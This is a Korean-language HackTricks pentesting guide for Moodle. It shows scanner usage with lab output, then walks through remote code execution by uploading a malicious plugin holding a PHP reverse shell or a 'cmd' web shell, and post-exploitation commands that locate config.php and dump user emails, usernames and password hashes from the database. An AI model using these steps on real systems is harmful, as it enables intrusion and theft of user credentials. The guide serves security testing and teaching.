# Moodle

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 고용 중입니다!** (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

## 자동 스캔

### droopescan
```bash
pip3 install droopescan
droopescan scan moodle -u http://moodle.example.com/<moodle_path>/

[+] Plugins found:
forum http://moodle.schooled.htb/moodle/mod/forum/
http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
http://moodle.schooled.htb/moodle/mod/forum/version.php

[+] No themes found.

[+] Possible version(s):
3.10.0-beta

[+] Possible interesting urls found:
Static readme file. - http://moodle.schooled.htb/moodle/README.txt
Admin panel - http://moodle.schooled.htb/moodle/login/

[+] Scan finished (0:00:05.643539 elapsed)
```
### moodlescan

moodlescan은 Moodle 시스템에 대한 취약점을 검사하는 도구입니다. 이 도구는 다양한 취약점을 식별하고, 사용자 계정 정보 노출, 취약한 파일 업로드, 취약한 플러그인 등의 문제를 찾을 수 있습니다.

moodlescan은 다음과 같은 기능을 제공합니다:

- 사용자 계정 정보 노출 여부 확인
- 취약한 파일 업로드 가능 여부 확인
- 취약한 플러그인 식별
- 취약한 디렉토리 노출 여부 확인
- 취약한 링크 식별
- 취약한 SQL 쿼리 식별

moodlescan을 사용하여 Moodle 시스템의 취약점을 식별하고 보안을 강화할 수 있습니다. 이 도구를 사용하여 시스템의 취약점을 미리 파악하고 대응할 수 있습니다.
```bash
#Install from https://github.com/inc0d3/moodlescan
python3 moodlescan.py -k -u http://moodle.example.com/<moodle_path>/

Version 0.7 - Dic/2020
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle/ ...

server         	: Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by   	: PHP/7.4.15
x-frame-options	: sameorigin
last-modified  	: Wed, 07 Apr 2021 21:33:41 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```
### CMSMap

CMSMap은 웹 사이트의 콘텐츠 관리 시스템(CMS)을 식별하기 위한 도구입니다. 이 도구는 다양한 CMS에 대한 정보를 수집하고, 취약점을 찾아내고, 관리자 패널에 대한 기본 자격 증명을 확인하는 데 사용됩니다. CMSMap은 다음과 같은 CMS를 식별할 수 있습니다:

- WordPress
- Joomla
- Drupal
- Magento
- PrestaShop
- OpenCart
- TYPO3
- Bitrix
- DedeCMS
- ExpressionEngine
- MODX
- Umbraco
- vBulletin
- Zen Cart

CMSMap은 웹 사이트의 CMS를 식별하는 데 유용한 도구입니다. 이를 통해 웹 사이트의 취약점을 파악하고, 보안을 강화할 수 있습니다.
```bash
pip3 install git+https://github.com/dionach/CMSmap.git
cmsmap http://moodle.example.com/<moodle_path>
```
### CVEs

자동 도구들은 moodle 버전에 영향을 주는 취약점을 찾는 데에는 거의 쓸모없다는 것을 발견했습니다. 이를 확인하려면 [https://snyk.io/vuln/composer:moodle%2Fmoodle](https://snyk.io/vuln/composer:moodle%2Fmoodle)에서 확인할 수 있습니다.

## RCE

**매니저** 역할이 필요하며 **"사이트 관리"** 탭에서 **플러그인을 설치**할 수 있습니다\*\*:\*\*

![](<../../.gitbook/assets/image (447).png>)

매니저이더라도 이 옵션을 **활성화해야 할 수도 있습니다**. moodle 권한 상승 PoC에서 확인할 수 있습니다: [https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321).

그런 다음, 다음 플러그인을 **설치**할 수 있습니다. 이 플러그인에는 클래식한 pentest-monkey php r**ev 쉘**이 포함되어 있습니다 (업로드하기 전에 압축을 풀고, revshell의 IP와 포트를 변경한 다음 다시 압축해야 합니다).

{% file src="../../.gitbook/assets/moodle-rce-plugin.zip" %}

또는 "cmd" 매개변수를 사용하여 일반 PHP 쉘을 얻기 위해 [https://github.com/HoangKien1020/Moodle\_RCE](https://github.com/HoangKien1020/Moodle\_RCE)에서 플러그인을 사용할 수도 있습니다.

악성 플러그인을 실행하려면 다음에 액세스해야 합니다:
```bash
http://domain.com/<moodle_path>/blocks/rce/lang/en/block_rce.php?cmd=id
```
## POST

### 데이터베이스 자격 증명 찾기
```bash
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
```
### 데이터베이스에서 자격 증명 덤프하기

To dump credentials from a database, you can use various techniques depending on the type of database you are targeting. Here are some common methods:

#### 1. SQL Injection

If the target application is vulnerable to SQL injection, you can exploit this vulnerability to extract credentials from the database. By injecting malicious SQL queries, you can retrieve usernames, passwords, and other sensitive information stored in the database.

#### 2. Brute-forcing

If you have obtained a database dump file or have access to the database server, you can attempt to brute-force the credentials. This involves trying different combinations of usernames and passwords until you find a valid login.

#### 3. Exploiting Misconfigurations

Sometimes, databases are misconfigured, allowing unauthorized access to sensitive information. By identifying and exploiting these misconfigurations, you can gain access to the credentials stored in the database.

#### 4. Password Hash Cracking

If the passwords in the database are stored as hashes, you can use password cracking techniques to recover the original passwords. This involves using tools like John the Ripper or Hashcat to crack the hashes and obtain the plaintext passwords.

Remember, it is important to have proper authorization and legal permission before attempting to dump credentials from a database. Unauthorized access to databases is illegal and unethical.
```bash
/usr/local/bin/mysql -u <username> --password=<password> -e "use moodle; select email,username,password from mdl_user; exit"
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 고용 중입니다!** (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 제로부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기교를 공유하세요.

</details>
